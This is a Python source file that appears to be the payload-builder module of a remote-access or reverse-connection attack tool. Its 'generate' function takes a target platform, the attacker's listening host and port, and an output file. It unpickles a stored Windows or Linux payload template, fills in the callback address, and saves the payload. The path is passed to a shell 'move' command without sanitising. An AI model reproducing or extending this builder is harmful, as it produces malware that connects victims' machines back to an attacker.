import sys
import fileinput
import traceback
import subprocess
from pickle import load
from os import path as P
from .var import globals as g


def generate(data=''):
    try:
        data = data.split('-')
        del data[0]
        for attr in data:
            if 'os ' in attr:
                plt = (attr.replace('os ', '')).replace(' ', '')
            elif 'lhost ' in attr:
                host = (attr.replace('lhost ', '')).replace(' ', '')
            elif 'lport ' in attr:
                port = int(attr.replace('lport ', '').replace(' ', ''))
            elif 'outfile ' in attr:
                path = P.abspath(attr.replace('outfile ', '')).replace(' ', '')
                name = P.basename(path)
            else:
                print(f"\n[{g.r}Error{g.e}] Invalid arguments!")
                print(f"[{g.bl}Fix{g.e}] Enter 'generate -h' to view full usage")
                return
    except Exception as err:
        print(err)
        print(f"\n[{g.r}Error{g.e}] Invalid arguments...")
        print(f"[{g.bl}Fix{g.e}] Enter generate --help to view usage")
        return
    if not P.exists(path.replace(name, '')):
        print(f"\nOutfile directory '{path.replace(name, '')}' doesn't exist")
        return
    try:
        if plt == 'win':
            print("\nGenerating Windows payload...\n")
            with open(r'sources/templates/win.bin', 'rb') as win:
                data = load(win)
                win.close()
            with open(r'sources/templates/win.py', 'w') as file:
                file.write(data)
                file.close()
            for line in fileinput.input(r'sources/templates/win.py', inplace=True):
                l1 = "host = ip"
                l2 = "port = prt"
                if l1 in line:
                    line = line.replace(l1, f"host = '{host}'")
                if l2 in line:
                    line = line.replace(l2, f"port = {port}")
                sys.stdout.write(line)
            subprocess.run(f'move sources\\templates\\win.py "{path}"', capture_output=True, shell=True)
            print(f"Windows Payload generated and saved as '{path}'")
        elif plt == 'linux':
            print("\nGenerating Linux payload...\n")
            with open(r'sources/templates/linux.bin', 'rb') as linx:
                data = load(linx)
                linx.close()
            with open(r'sources/templates/linux.py', 'w') as file:
                file.write(data)
                file.close()
            for line in fileinput.input(r'sources/templates/linux.py', inplace=True):
                l1 = "host = ip"
                l2 = "port = prt"
                if l1 in line:
                    line = line.replace(l1, f"host = '{host}'")
                if l2 in line:
                    line = line.replace(l2, f"port = {port}")
                sys.stdout.write(line)
            subprocess.run(f'move sources\\templates\\linux.py "{path}"', capture_output=True, shell=True)
            print(f"Linux Payload generated and saved as '{path}'")
        else:
            print('\nInvalid platform!')
            print("Enter 'generate -h' to view full usage")
    except Exception:
        print(traceback.format_exc())
